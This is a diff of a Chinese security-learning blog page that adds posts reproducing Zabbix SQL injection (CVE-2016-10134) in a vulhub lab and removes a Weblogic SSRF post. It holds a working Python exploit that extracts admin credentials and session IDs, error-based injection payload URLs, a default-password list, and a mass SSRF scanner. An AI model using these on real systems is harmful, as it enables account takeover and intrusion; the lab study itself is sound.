@@ -249,6 +249,353 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/21/Zabbix（分布式系统监视）漏洞学习/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wcute">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="鸡翅儿">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/21/Zabbix（分布式系统监视）漏洞学习/" itemprop="url">Zabbix（分布式系统监视）漏洞学习</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-21T14:36:23+08:00">
+                2018-12-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞学习/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="Zabbix-安装部署"><a href="#Zabbix-安装部署" class="headerlink" title="Zabbix 安装部署"></a>Zabbix 安装部署</h3><h4 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h4><blockquote>
+<p>OS：CentOS 7.2 64bit<br>Zabbix版本：3.0.24<br>MySQL版本：5.7<br>注：zabbix3.0相关要求 mysql5.0以上版本、apache1.3以上版本、php5.4以上版本。</p>
+</blockquote>
+<h4 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h4><ol>
+<li>关闭<code>selinux</code>和<code>iptables</code><blockquote>
+<p>[root@test ~]# systemctl stop firewalld.service<br>[root@test ~]# setenforce 0<br>setenforce: SELinux is disabled</p>
+</blockquote>
+</li>
+<li>安装<code>Zabbix rpm</code>包仓库<blockquote>
+<p>[root@test ~]# rpm -vhi <a href="http://repo.zabbix.com/zabbix/3.0/rhel/7/x86_64/zabbix-release-3.0-1.el7.noarch.rpm" target="_blank" rel="noopener">http://repo.zabbix.com/zabbix/3.0/rhel/7/x86_64/zabbix-release-3.0-1.el7.noarch.rpm</a></p>
+</blockquote>
+</li>
+<li>安装<code>zabbix-server-mysql</code>和<code>zabbix-web-mysql</code><blockquote>
+<p>[root@test ~]# yum install -y zabbix-server-mysql zabbix-web-mysql</p>
+</blockquote>
+</li>
+<li>启动<code>mysql</code><blockquote>
+<p>[root@test ~]# systemctl start mysqld<br>[root@test ~]# /sbin/chkconfig mysqld on #开机启动<br>[root@test ~]# mysql_secure_installation #初始化数据库信息</p>
+</blockquote>
+</li>
+<li>创建<code>zabbix</code>数据库，创建<code>zabbix</code>账号<blockquote>
+<p>[root@test ~]# mysql -uroot -p<br>mysql&gt;  create database zabbix character set utf8 collate utf8_bin;<br>Query OK, 1 row affected (0.00 sec)<br>mysql&gt; grant all privileges on zabbix.* to ‘zabbix‘@’localhost’ identified by ‘zabbix’;<br>Query OK, 0 rows affected (0.00 sec)<br>mysql&gt; flush privileges;<br>Query OK, 0 rows affected (0.01 sec)</p>
+</blockquote>
+</li>
+<li>导入默认的<code>zabbix</code>数据库信息<blockquote>
+<p>[root@test ~]# zcat /usr/share/doc/zabbix-server-mysql-3.0.24/create.sql.gz | mysql zabbix -uzabbix -pzabbix</p>
+</blockquote>
+</li>
+<li>修改<code>zabbix_server.conf</code>的配置文件<blockquote>
+<p>[root@test ~]#  grep ^DB /etc/zabbix/zabbix_server.conf<br>DBName=zabbix<br>DBUser=zabbix<br>DBPassword=zabbix</p>
+</blockquote>
+</li>
+<li>修改配置文件<code>/etc/httpd/conf.d/zabbix.conf</code>，时区改成 Asia/Shanghai<blockquote>
+<p>php_value date.timezone Asia/Shanghai</p>
+</blockquote>
+</li>
+<li>启动<code>apache</code> <code>zabbix-server</code>服务并设置为开机启动<blockquote>
+<p>[root@test ~]# systemctl start httpd<br>[root@test ~]# systemctl enable httpd<br>[root@test ~]# netstat -an |grep 80<br>tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN<br>[root@test ~]# systemctl start zabbix-server<br>[root@test ~]# systemctl enable zabbix-server</p>
+</blockquote>
+</li>
+<li>访问<code>http://ip/zabbix/setup.php</code>进入安装页面<blockquote>
+<p>Next step-Next step-配置zabbix-Next step-Next step-Finsh</p>
+</blockquote>
+</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-0e91ffca04314521.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+<ol start="11">
+<li>默认账号<code>Admin</code> 密码<code>zabbix</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-4745086aaa626e7b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></li>
+<li>移除或改名web目录下面的<code>setup.php</code>文件<blockquote>
+<p>[root@test ~]# cd /usr/share/zabbix/<br>[root@test zabbix]# mv setup.php setup.php.bak</p>
+</blockquote>
+</li>
+</ol>
+<h3 id="Zabbix-默认密码"><a href="#Zabbix-默认密码" class="headerlink" title="Zabbix 默认密码"></a>Zabbix 默认密码</h3><p>弱口令<br>WeapPassword = [(“admin”,”zabbix”),(“Admin”,”zabbix”),(“guest”,””)]</p>
+<h3 id="zabbix-latest-php-SQL注入漏洞（CVE-2016-10134）"><a href="#zabbix-latest-php-SQL注入漏洞（CVE-2016-10134）" class="headerlink" title="zabbix latest.php SQL注入漏洞（CVE-2016-10134）"></a>zabbix latest.php SQL注入漏洞（CVE-2016-10134）</h3><p>漏洞详情：latest.php处toogle_ids[]参数SQL注入，可获取系统权限<br>利用条件：登录后<br>影响版本：2.2.x, 3.0.x<br>漏洞复现：<a href="https://www.jianshu.com/p/40a0e8238878" target="_blank" rel="noopener">https://www.jianshu.com/p/40a0e8238878</a></p>
+<h3 id="注入检测EXP"><a href="#注入检测EXP" class="headerlink" title="注入检测EXP"></a>注入检测EXP</h3><p>附上大佬的EXP<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># Date: 2016/8/18</span><br><span class="line"># Modified by: Jamin Zhang</span><br><span class="line"></span><br><span class="line">import urllib2</span><br><span class="line">import sys, os</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def deteck_Sql():</span><br><span class="line">    u&apos;检查是否存在 SQL 注入&apos;</span><br><span class="line">    payload = &quot;jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=999&apos;&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&amp;itemids%5B23297%5D=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=1&quot;</span><br><span class="line">    try:</span><br><span class="line">        response = urllib2.urlopen(url + payload, timeout=10).read()</span><br><span class="line">    except Exception, msg:</span><br><span class="line">        print msg</span><br><span class="line">    else:</span><br><span class="line">        key_reg = re.compile(r&quot;INSERT\s*INTO\s*profiles&quot;)</span><br><span class="line">        if key_reg.findall(response):</span><br><span class="line">            return True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def sql_Inject(sql):</span><br><span class="line">    u&apos;获取特定sql语句内容&apos;</span><br><span class="line">    payload = url + &quot;jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=&quot; + urllib2.quote(</span><br><span class="line">        sql) + &quot;&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&amp;itemids[23297]=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=1&quot;</span><br><span class="line">    try:</span><br><span class="line">        response = urllib2.urlopen(payload, timeout=10).read()</span><br><span class="line">    except Exception, msg:</span><br><span class="line">        print msg</span><br><span class="line">    else:</span><br><span class="line">        result_reg = re.compile(r&quot;Duplicate\s*entry\s*&apos;~(.+?)~1&quot;)</span><br><span class="line">        results = result_reg.findall(response)</span><br><span class="line">        if results:</span><br><span class="line">            return results[0]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    # os.system([&apos;clear&apos;, &apos;cls&apos;][os.name == &apos;nt&apos;])</span><br><span class="line">    print &apos;+&apos; + &apos;-&apos; * 60 + &apos;+&apos;</span><br><span class="line">    print u&apos;\t   Python Zabbix &lt; 3.0.4 SQL 注入 Exploit&apos;</span><br><span class="line">    print &apos;\t    Origin Author: http://www.waitalone.cn/&apos;</span><br><span class="line">    print &apos;\t\t   Modified by: Jamin Zhang&apos;</span><br><span class="line">    print &apos;\t\t   Date: 2016-08-18&apos;</span><br><span class="line">    print &apos;+&apos; + &apos;-&apos; * 60 + &apos;+&apos;</span><br><span class="line">    if len(sys.argv) != 2:</span><br><span class="line">        print u&apos;用法: &apos; + os.path.basename(sys.argv[0]) + u&apos; [Zabbix Server Web 后台 URL]&apos;</span><br><span class="line">        print u&apos;实例: &apos; + os.path.basename(sys.argv[0]) + &apos; http://jaminzhang.github.io&apos;</span><br><span class="line">        sys.exit()</span><br><span class="line">    url = sys.argv[1]</span><br><span class="line">    if url[-1] != &apos;/&apos;: url += &apos;/&apos;</span><br><span class="line">    passwd_sql = &quot;(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select concat(name,0x3a,passwd) from  users limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)&quot;</span><br><span class="line">    session_sql = &quot;(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select sessionid from sessions limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)&quot;</span><br><span class="line">    if deteck_Sql():</span><br><span class="line">        print u&apos;Zabbix 存在 SQL 注入漏洞！\n&apos;</span><br><span class="line">        print u&apos;管理员  用户名密码：%s&apos; % sql_Inject(passwd_sql)</span><br><span class="line">        print u&apos;管理员  Session_id：%s&apos; % sql_Inject(session_sql)</span><br><span class="line">    else:</span><br><span class="line">        print u&apos;Zabbix 不存在 SQL 注入漏洞！\n&apos;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/12585049-79d6b578fd713628.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>关闭 guest 访问权限，加强管理员密码强度<br>对zabbix后台做访问控制，只允许指定IP访问zabbix-server后台</p>
+<p>参考链接：<br><a href="https://www.cnblogs.com/xiewenming/p/7732144.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiewenming/p/7732144.html</a><br><a href="https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/" target="_blank" rel="noopener">https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/21/zabbix  SQL注入漏洞复现/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wcute">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="鸡翅儿">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/21/zabbix  SQL注入漏洞复现/" itemprop="url">zabbix  SQL注入漏洞复现</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-21T14:34:25+08:00">
+                2018-12-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞复现/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞复现</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>环境搭建好才发现vulhub上已经有了，这里还是使用vulhub进行漏洞复现，自己搭建环境的话需要开启<code>guest</code>访问权限</p>
+<h3 id="Zabbix-SQL-latest-php-注入漏洞（CVE-2016-10134）"><a href="#Zabbix-SQL-latest-php-注入漏洞（CVE-2016-10134）" class="headerlink" title="Zabbix SQL(latest.php) 注入漏洞（CVE-2016-10134）"></a>Zabbix SQL(latest.php) 注入漏洞（CVE-2016-10134）</h3><h4 id="启动环境"><a href="#启动环境" class="headerlink" title="启动环境"></a>启动环境</h4><blockquote>
+<p>  docker-compose up -d</p>
+</blockquote>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>访问<code>http://ip:8080</code>，用账号<code>guest</code>（密码为空）登录游客账户<br>登录后，查看Cookie中的<code>zbx_sessionid</code>，复制后16位字符<br><img src="https://upload-images.jianshu.io/upload_images/12585049-389af9c28223d7d8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>payload：zabbix/latest.php?output=ajax&amp;sid=caeaeefde7aafed5&amp;favobj=toggle&amp;toggle_open_state=1&amp;toggle_ids[]=updatexml(0,concat(0xa,user()),0)<br><img src="https://upload-images.jianshu.io/upload_images/12585049-85700702d5aaa2f6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+<h3 id="Zabbix-SQL-jsrpc-php-注入漏洞"><a href="#Zabbix-SQL-jsrpc-php-注入漏洞" class="headerlink" title="Zabbix SQL(jsrpc.php) 注入漏洞"></a>Zabbix SQL(jsrpc.php) 注入漏洞</h3><p>漏洞产生原因：<code>profileIdx2</code> 参数没有被过滤<br>利用条件：<code>guest</code>用户开启，允许访问<br>影响版本：<code>2.0.x</code>| <code>2.2.x</code>| <code>2.4.x</code>| <code>3.0.0-3.0.3</code><br>payload：zabbix/jsrpc.php?type=0&amp;mode=1&amp;method=screen.get&amp;profileIdx=web.item.graph&amp;resourcetype=17&amp;profileIdx2=updatexml(0,concat(0xa,user()),0)<br><img src="https://upload-images.jianshu.io/upload_images/12585049-9925ef38f777fcee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/10/Django--（Models）/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -691,343 +1038,6 @@
 <blockquote>
 <p>在 models.py 的 Article 类中添加一个方法<br>python3 使用 def <strong>str</strong>(self):<br>return self.title<br>python2 使用 def <strong>unicode</strong>(self):<br>return self.title</p>
 </blockquote>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/Weblogic-SSRF-漏洞复现/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="wcute">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="鸡翅儿">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/12/09/Weblogic-SSRF-漏洞复现/" itemprop="url">Weblogic-SSRF-漏洞复现</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T12:33:03+08:00">
-                2018-12-09
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/漏洞复现/" itemprop="url" rel="index">
-                    <span itemprop="name">漏洞复现</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>关于SSRF漏洞的原理以及利用已经记录过了，可以访问 查看，这次复现一下这个漏洞</p>
-<p>本次还是利用<code>vulhub</code>进行漏洞复现<hr></p>
-<h4 id="测试环境搭建"><a href="#测试环境搭建" class="headerlink" title="测试环境搭建"></a>测试环境搭建</h4><blockquote>
-<p>docker-compose build<br>docker-compose up -d</p>
-</blockquote>
-<p>访问<code>http://本地ip:7001/uddiexplorer/</code>，即可查看uddiexplorer应用<br><img src="https://upload-images.jianshu.io/upload_images/12585049-68bb4fd2fdf2f855.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<hr>
-
-<h4 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h4><p>SSRF漏洞存在于<code>http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp</code>，提交参数值为<code>url:port</code>，根据返回错误不同，可对内网状态进行探测如端口开放状态等</p>
-<ol>
-<li><p>访问一个可以访问的<code>ip:port</code>，一般返回一个状态码，<code>The server at http://192.168.60.168:7001/ returned a 404 error code &amp;#40;Not Found&amp;#41;</code>如图<br><img src="https://upload-images.jianshu.io/upload_images/12585049-db3ef399b2fe3e0c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-</li>
-<li><p>访问一个不存在的端口，将返回<code>but could not connect over HTTP to server</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-ce451d10f52c5637.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-</li>
-<li>访问一个非http协议，则返回<code>did not have a valid SOAP content-type</code></li>
-</ol>
-<p><hr></p>
-<h4 id="redis-反弹-shell"><a href="#redis-反弹-shell" class="headerlink" title="redis 反弹 shell"></a>redis 反弹 shell</h4><p><hr><br>附上大佬<code>weblogic ssrf</code>检测脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line">import Queue</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">from requests.packages.urllib3.exceptions import InsecureRequestWarning</span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">queue = Queue.Queue()</span><br><span class="line">mutex = threading.Lock()</span><br><span class="line"></span><br><span class="line">class Weblogic_SSRF_Check(threading.Thread):</span><br><span class="line">    &quot;&quot;&quot;docstring for Weblogic_SSRF_Check&quot;&quot;&quot;</span><br><span class="line">    def __init__(self, queue):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.queue = queue</span><br><span class="line"></span><br><span class="line">    def check(self,domain,ip):</span><br><span class="line">        payload = &quot;uddiexplorer/SearchPublicRegistries.jsp?operator=&#123;ip&#125;&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&quot;.format(ip=ip)</span><br><span class="line">        url = domain + payload</span><br><span class="line"></span><br><span class="line">        try:</span><br><span class="line">            html = requests.get(url=url, timeout=15, verify=False).content</span><br><span class="line"></span><br><span class="line">            m = re.search(&apos;weblogic.uddi.client.structures.exception.XML_SoapException&apos;,html)</span><br><span class="line">            if m:</span><br><span class="line">                mutex.acquire()</span><br><span class="line">                with open(&apos;ssrf.txt&apos;,&apos;a+&apos;) as f:</span><br><span class="line">                    print &quot;%s has weblogic ssrf.&quot; % domain</span><br><span class="line">                    f.write(&quot;%s has weblogic ssrf.\n&quot; % domain)</span><br><span class="line">                mutex.release()</span><br><span class="line">        except Exception,e:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line">    def get_registry(self,domain):</span><br><span class="line">        payload = &apos;uddiexplorer/SetupUDDIExplorer.jsp&apos;</span><br><span class="line">        url = domain + payload</span><br><span class="line"></span><br><span class="line">        try:</span><br><span class="line">            html = requests.get(url=url, timeout=15, verify=False).content</span><br><span class="line">            m = re.search(&apos;&lt;i&gt;For example: (.*?)/uddi/uddilistener.*?&lt;/i&gt;&apos;,html)</span><br><span class="line">            if m:</span><br><span class="line">                return m.group(1)</span><br><span class="line">        except Exception,e:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        while not self.queue.empty():</span><br><span class="line">            domain = self.queue.get()</span><br><span class="line">            mutex.acquire()</span><br><span class="line">            print domain</span><br><span class="line">            mutex.release()</span><br><span class="line">            ip = self.get_registry(domain)</span><br><span class="line">            self.check(domain,ip)</span><br><span class="line"></span><br><span class="line">            self.queue.task_done()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    with open(&apos;domain.txt&apos;,&apos;r&apos;) as f:</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">    for line in lines:</span><br><span class="line">        queue.put(line.strip())</span><br><span class="line"></span><br><span class="line">    for x in xrange(1,50):</span><br><span class="line">        t = Weblogic_SSRF_Check(queue)</span><br><span class="line">        t.setDaemon(True)</span><br><span class="line">        t.start()</span><br><span class="line">    queue.join()</span><br></pre></td></tr></table></figure></p>
-<p><hr><br>参考链接：<br><a href="http://wyb0.com/posts/weblogic-ssrf-check/" target="_blank" rel="noopener">http://wyb0.com/posts/weblogic-ssrf-check/</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/Django---简单博客搭建（2）/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="wcute">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="鸡翅儿">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/12/09/Django---简单博客搭建（2）/" itemprop="url">Django---简单博客搭建（2）</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T12:33:03+08:00">
-                2018-12-09
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/Python/" itemprop="url" rel="index">
-                    <span itemprop="name">Python</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
